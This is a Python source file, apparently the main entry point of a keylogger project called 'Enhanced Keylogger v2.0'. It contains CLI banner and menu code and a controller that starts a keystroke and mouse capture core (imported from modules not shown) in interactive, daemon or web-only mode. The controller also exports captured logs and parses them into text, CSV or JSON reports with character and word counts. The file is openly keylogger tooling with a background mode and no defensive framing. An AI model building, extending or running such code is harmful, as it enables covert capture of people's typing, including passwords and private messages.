#!/usr/bin/env python3
"""Main entry point for the enhanced keylogger application."""

import os
import sys
import time
import signal
import logging
import argparse
import threading
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

try:
    from core.config_manager import ConfigManager
    from core.encryption_manager import EncryptionManager
    from core.logging_manager import LoggingManager
    from core.keylogger import KeyloggerCore
    from parsers.log_parser import LogParser
    from web.app import create_web_app
except ImportError as e:
    print(f"Error importing modules: {e}")
    print("Please ensure all required dependencies are installed.")
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('keylogger_main.log')
    ]
)

logger = logging.getLogger(__name__)

# ---------- CLI Rendering Helpers ----------
# Colors & styling (ANSI) with optional colorama for Windows
try:  # optional dependency, not required
    import colorama  # type: ignore
    colorama.just_fix_windows_console()  # enable ANSI on Windows terminals
except Exception:
    pass

class _Style:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    # 256-color approximations for yellow/orange
    YELLOW = "\033[38;5;226m"
    ORANGE = "\033[38;5;214m"
    CYAN = "\033[36m"
    MAGENTA = "\033[35m"
    GREEN = "\033[32m"
    RED = "\033[31m"
    GRAY = "\033[90m"
    WHITE = "\033[97m"

def _color(text: str, *styles: str) -> str:
    if not sys.stdout.isatty():
        return text
    return "".join(styles) + text + _Style.RESET

def _rule(width: int = 72, char: str = "─") -> str:
    return char * width

def _banner_keylogger() -> str:
    # Stylized banner approximating the reference look
    lines = [
        "  _  __  ______  __   __  _                                 ",
        " | |/ / |  ____| \\ \\ / / | |                                ",
        " | ' /  | |__     \\ V /  | | ___  _ __   ___  _ __  ___     ",
        " |  <   |  __|     > <   | |/ _ \\| '_ \\ / _ \\| '_ \\ / __|    ",
        " | . \\  | |____   / . \\  | | (_) | | | | (_) | | | \\__ \\    ",
        " |_|\\_\\ |______| /_/ \\_\\ |_|\\___/|_| |_|\\___/|_| |_|___/    ",
    ]
    # Apply a yellow/orange gradient per line
    out = []
    for i, ln in enumerate(lines):
        color = _Style.YELLOW if i % 2 == 0 else _Style.ORANGE
        out.append(_color(ln, color, _Style.BOLD))
    return "\n".join(out)

def print_cli_header(title: str = "KEYLOGGER", subtitle: str = "Enhanced Keylogger v2.0") -> None:
    width = 72
    # Chevron + title line similar to the reference
    chevron = _color(">", _Style.ORANGE, _Style.BOLD)
    title_colored = _color(f" {title}", _Style.YELLOW, _Style.BOLD)
    print(f"{chevron}{title_colored}")
    print()
    print(_banner_keylogger())
    print()
    # Subtitle centered
    print(_color(subtitle.center(width), _Style.GRAY))

# Blocks in reference layout
def _tips_block():
    print(_color("Tips for getting started:", _Style.WHITE, _Style.BOLD))
    tips = [
        "1. Ask questions, edit files, or run commands.",
        "2. Be specific for the best results.",
        "3. Type 'help' for more information.",
    ]
    for t in tips:
        print(_color(t, _Style.GRAY))

def _greeting_block():
    print()
    print(_color("➤ Hello, CLI world! 🚀", _Style.WHITE, _Style.BOLD))
    print(_color("I'm Keylogger CLI. Ready to help you monitor and manage. Use the menu or type a command.", _Style.GRAY))

def _using_block(config_path: str):
    print()
    print(_color(f"Using 1 {config_path} file", _Style.CYAN))

def _input_hint_panel():
    hint = _color(" Type your command (e.g., status, stats, export, config, stop, quit)", _Style.GRAY)
    width = 72
    inner = hint.ljust(width - 2)
    print(_color("┌" + "─" * (width - 2) + "┐", _Style.GRAY))
    print(_color("│" + inner + "│", _Style.GRAY))
    print(_color("└" + "─" * (width - 2) + "┘", _Style.GRAY))

def _status_bar(cwd: str, mode: str, extra: str = ""):
    # Mimic segmented status bar with colors
    parts = [
        _color(cwd, _Style.CYAN),
        _color(mode, _Style.MAGENTA),
    ]
    if extra:
        parts.append(_color(extra, _Style.GRAY))
    line = "  ".join(parts)
    print("\n" + line)

# ---------- End CLI Rendering Helpers ----------


class KeyloggerApplication:
    """Main keylogger application controller."""
    
    def __init__(self, config_file: str = None):
        self.config_file = config_file or 'config.json'
        self.keylogger_core = None
        self.web_app = None
        self.web_thread = None
        self.running = False
        
        # Initialize components
        self._initialize_components()
        
        # Setup signal handlers
        self._setup_signal_handlers()

    def _initialize_components(self):
        """Initialize all application components."""
        try:
            logger.info("Initializing keylogger components...")
            
            # Initialize configuration manager
            self.config_manager = ConfigManager(self.config_file)
            
            # Initialize core keylogger
            self.keylogger_core = KeyloggerCore(self.config_file)
            
            # Initialize web interface if enabled
            if self.config_manager.get('web.enabled', False):
                self.web_app = create_web_app(self.keylogger_core, self.config_manager)
                if not self.web_app:
                    logger.warning("Web interface could not be initialized")
            
            logger.info("All components initialized successfully")
            
        except Exception as e:
            logger.error(f"Error initializing components: {e}")
            raise
    
    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info(f"Received signal {signum}, shutting down gracefully...")
            self.stop()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Windows-specific
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, signal_handler)
    
    def start(self, web_only: bool = False, daemon: bool = False):
        """Start the keylogger application."""
        try:
            logger.info("Starting keylogger application...")
            self.running = True
            
            # Start web interface if enabled
            if self.web_app:
                self._start_web_interface()
            
            # Start keylogger core if not web-only mode
            if not web_only:
                if daemon:
                    self._start_daemon_mode()
                else:
                    self._start_interactive_mode()
            else:
                logger.info("Running in web-only mode")
                if not self.keylogger_core.start():
                    logger.error("Failed to start keylogger core")
                    return
                self._wait_for_shutdown()
            
        except KeyboardInterrupt:
            logger.info("Interrupted by user")
        except Exception as e:
            logger.error(f"Error starting application: {e}")
            raise
        finally:
            self.stop()
    
    def _start_web_interface(self):
        """Start the web interface in a separate thread."""
        try:
            logger.info("Starting web interface...")
            
            def run_web_app():
                try:
                    host = self.config_manager.get('web.host', '127.0.0.1')
                    port = self.config_manager.get('web.port', 5000)
                    debug = bool(self.config_manager.get('web.debug', False))
                    self.web_app.run(host=host, port=port, debug=debug, threaded=True, use_reloader=False)
                except Exception as e:
                    logger.error(f"Web interface error: {e}")
            
            self.web_thread = threading.Thread(target=run_web_app, daemon=True)
            self.web_thread.start()
            
            # Give web server time to start
            time.sleep(2)
            
            host = self.config_manager.get('web.host', '127.0.0.1')
            port = self.config_manager.get('web.port', 5000)
            logger.info(f"Web interface available at http://{host}:{port}")
            
        except Exception as e:
            logger.error(f"Error starting web interface: {e}")
    
    def _start_daemon_mode(self):
        """Start keylogger in daemon mode."""
        try:
            logger.info("Starting keylogger in daemon mode...")
            
            # Start keylogger
            if not self.keylogger_core.start():
                logger.error("Failed to start keylogger core")
                return
            
            # Wait for shutdown signal
            self._wait_for_shutdown()
            
        except Exception as e:
            logger.error(f"Error in daemon mode: {e}")
    
    def _start_interactive_mode(self):
        """Start keylogger in interactive mode."""
        try:
            logger.info("Starting keylogger in interactive mode...")
            logger.info("Press Ctrl+C to stop")
            
            # Start keylogger
            if not self.keylogger_core.start():
                logger.error("Failed to start keylogger core")
                return
            
            # Interactive command loop
            self._interactive_loop()
            
        except Exception as e:
            logger.error(f"Error in interactive mode: {e}")
    
    # ---------- Interactive CLI Utilities ----------
    def _clear_screen(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except Exception:
            pass

    def _print_reference_style_ui(self, mode_label: str):
        # Header + banner
        print_cli_header("KEYLOGGER", "Enhanced Keylogger v2.0")
        # Tips and greeting
        print()
        _tips_block()
        _greeting_block()
        # Using block (configuration)
        cfg = os.path.basename(self.config_file)
        _using_block(cfg)
        # Input hint panel
        print()
        _input_hint_panel()
        # Bottom status bar (path + mode)
        cwd = str(project_root)
        _status_bar(cwd, mode_label, extra=f"pid {os.getpid()}")

    def _pause(self, message: str = None):
        if message:
            print(_color(message, _Style.GREEN))
        try:
            input(_color("\nPress Enter to return to the menu...", _Style.DIM))
        except Exception:
            pass
    # ---------- End Interactive CLI Utilities ----------

    def _interactive_loop(self):
        """Interactive command loop."""
        try:
            while self.running:
                try:
                    # Draw UI in the reference style
                    self._clear_screen()
                    self._print_reference_style_ui(mode_label="interactive")

                    # Menu summary (compact, matches CLI conventions)
                    print()
                    print(_color("Commands: ", _Style.WHITE, _Style.BOLD) + _color("status, stats, export, config, stop, quit, help", _Style.GRAY))
                    
                    choice = input(_color("\n> ", _Style.WHITE, _Style.BOLD)).strip().lower()

                    # Map inputs to commands
                    if choice in ('1', 'status', 's'):
                        self._show_status()
                        self._pause("[OK] Status displayed.")
                    elif choice in ('2', 'stats'):
                        self._show_statistics()
                        self._pause("[OK] Statistics displayed.")
                    elif choice in ('3', 'export', 'e'):
                        self._export_logs()
                        self._pause()
                    elif choice in ('4', 'config', 'reload', 'r'):
                        self._reload_config()
                        self._pause("[OK] Configuration reloaded.")
                    elif choice in ('5', 'stop'):
                        self.keylogger_core.stop()
                        print(_color("[OK] Keylogger stopped.", _Style.GREEN))
                        self._pause()
                    elif choice in ('6', 'quit', 'exit', 'q'):
                        break
                    elif choice in ('h', '?', 'help'):
                        # Redisplay on next iteration
                        continue
                    elif choice == '':
                        continue
                    else:
                        print(_color(f"[Invalid] Unrecognized choice: {choice}", _Style.RED))
                        self._pause()
                
                except EOFError:
                    break
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logger.error(f"Error in interactive loop: {e}")
                    print(f"Error: {e}")
                    self._pause()
            
        except Exception as e:
            logger.error(f"Error in interactive loop: {e}")
    
    def _show_status(self):
        """Show keylogger status."""
        try:
            stats = self.keylogger_core.get_stats()
            print("\n" + _rule())
            print(_color("Status", _Style.WHITE, _Style.BOLD))
            print(_rule())
            print(f"  Running: {self.keylogger_core.is_running}")
            print(f"  Session ID: {stats['system']['session_id']}")
            print(f"  Uptime: {stats['keylogger']['uptime_seconds']:.1f} seconds")
            print(f"  Total Events: {stats['keylogger']['total_events']}")
            
        except Exception as e:
            print(f"Error getting status: {e}")
    
    def _show_statistics(self):
        """Show keylogger statistics."""
        try:
            stats = self.keylogger_core.get_stats()
            print("\n" + _rule())
            print(_color("Statistics", _Style.WHITE, _Style.BOLD))
            print(_rule())
            print(f"  Total Events: {stats.get('total_events', 0)}")
            print(f"  Buffer Size: {stats.get('buffer_size', 0)}")
            print(f"  Log File Size: {stats.get('log_file_size_mb', 0):.2f} MB")
            print(f"  Errors: {stats.get('errors', 0)}")
            
            # Component stats
            if hasattr(self.keylogger_core, 'keyboard_listener'):
                kb_stats = getattr(self.keylogger_core.keyboard_listener, 'stats', {})
                print(f"  Keys Pressed: {kb_stats.get('keys_pressed', 0)}")
            
            if hasattr(self.keylogger_core, 'mouse_listener'):
                mouse_stats = getattr(self.keylogger_core.mouse_listener, 'stats', {})
                print(f"  Mouse Clicks: {mouse_stats.get('total_clicks', 0)}")
            
        except Exception as e:
            print(f"Error getting statistics: {e}")
    
    def _export_logs(self):
        """Export logs interactively."""
        try:
            print("\n" + _rule())
            print(_color("Export Options", _Style.WHITE, _Style.BOLD))
            print(_rule())
            print("  1. JSON format")
            print("  2. CSV format")
            print("  3. Text report")
            
            choice = input("Select format (1-3): ").strip()
            
            if choice == '1':
                format_type = 'json'
            elif choice == '2':
                format_type = 'csv'
            elif choice == '3':
                format_type = 'text'
            else:
                print(_color("[Invalid] Please select 1, 2, or 3.", _Style.RED))
                return
            
            filename = input(f"Enter filename (default: export.{format_type}): ").strip()
            if not filename:
                filename = f"export.{format_type}"
            
            # Export logs
            success = self.keylogger_core.export_logs(filename, format_type)
            
            if success:
                print(_color(f"[OK] Logs exported to: {filename}", _Style.GREEN))
            else:
                print(_color("[ERROR] Export failed", _Style.RED))
            
        except Exception as e:
            print(_color(f"[ERROR] Error exporting logs: {e}", _Style.RED))
    
    def _reload_config(self):
        """Reload configuration."""
        try:
            self.keylogger_core.reload_config()
            print(_color("[OK] Configuration reloaded", _Style.GREEN))
        except Exception as e:
            print(_color(f"[ERROR] Error reloading configuration: {e}", _Style.RED))
    
    def _wait_for_shutdown(self):
        """Wait for shutdown signal."""
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    def stop(self):
        """Stop the keylogger application."""
        try:
            logger.info("Stopping keylogger application...")
            self.running = False
            
            # Stop keylogger core
            if self.keylogger_core:
                self.keylogger_core.stop()
            
            # Web interface will stop when main thread exits
            
            logger.info("Keylogger application stopped")
            
        except Exception as e:
            logger.error(f"Error stopping application: {e}")
    
    def parse_logs(self, input_file: str, output_file: str = None, format_type: str = 'text'):
        """Parse existing log files."""
        try:
            logger.info(f"Parsing log file: {input_file}")
            
            # Create log parser
            parser = LogParser(self.config_manager)
            
            # Parse the file
            events = parser.parse_log_file(input_file)
            
            if not events:
                print("No events found or error parsing file.")
                return False
            
            # Generate output
            if format_type == 'text':
                output_file = output_file or 'parsed_report.txt'
                parser.generate_readable_report(events, output_file)
            elif format_type == 'csv':
                output_file = output_file or 'parsed_data.csv'
                parser.export_to_csv(events, output_file)
            elif format_type == 'json':
                output_file = output_file or 'parsed_data.json'
                parser.export_to_json(events, output_file)
            else:
                print(f"Unknown format: {format_type}")
                return False
            
            print(f"Parsed {len(events)} events")
            print(f"Output saved to: {output_file}")
            
            # Show statistics
            stats = parser.get_statistics()
            print(f"\nParsing Statistics:")
            print(f"  Total events: {stats['total_events']}")
            print(f"  Total characters: {stats['total_characters']}")
            print(f"  Total words: {stats['total_words']}")
            print(f"  Processing errors: {stats['processing_errors']}")
            
            return True
            
        except Exception as e:
            logger.error(f"Error parsing logs: {e}")
            print(f"Error parsing logs: {e}")
            return False


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='Enhanced Keylogger Application')
    parser.add_argument('-c', '--config', help='Configuration file path', default='config.json')
    parser.add_argument('-w', '--web-only', action='store_true', help='Run web interface only')
    parser.add_argument('-d', '--daemon', action='store_true', help='Run as daemon')
    parser.add_argument('--parse', help='Parse existing log file')
    parser.add_argument('-o', '--output', help='Output file for parsing')
    parser.add_argument('-f', '--format', choices=['text', 'csv', 'json'], default='text', help='Output format for parsing')
    parser.add_argument('--version', action='version', version='Enhanced Keylogger 2.0')
    
    args = parser.parse_args()
    
    try:
        # Create application instance
        app = KeyloggerApplication(args.config)
        
        # Global header on start (reference-style header)
        print_cli_header("KEYLOGGER", "Enhanced Keylogger v2.0")
        
        # Handle parsing mode
        if args.parse:
            success = app.parse_logs(args.parse, args.output, args.format)
            sys.exit(0 if success else 1)
        
        # Handle normal operation
        if args.web_only:
            print("Starting in web-only mode...")
        elif args.daemon:
            print("Starting in daemon mode...")
        else:
            print("Starting in interactive mode...")
        print(_rule())
        
        # Start the application
        app.start(web_only=args.web_only, daemon=args.daemon)
        
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    except Exception as e:
        logger.error(f"Application error: {e}")
        print(f"Error: {e}")
        sys.exit(1)
    
    print("Application terminated")


if __name__ == '__main__':
    main()